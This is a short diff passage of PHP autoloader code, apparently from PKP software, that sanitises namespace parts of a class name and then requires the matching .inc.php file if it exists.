+	if (count($parts) < 2) {
+		return;
+	}
+
+	$className = Core::cleanFileVar(array_pop($parts));
+	$parts = array_map(function($part) {
+		$part = Core::cleanFileVar($part);
+		if (strlen($part)>1) $part[0] = strtolower_codesafe($part[0]); // pkp/pkp-lib#5731
+		return $part;
+	}, $parts);
+
+	$subParts = join('/', $parts);
+	$filePath = "{$rootPath}/{$subParts}/{$className}.inc.php";
+
+	if (is_file($filePath)) {
+		require_once($filePath);
+	}
+}
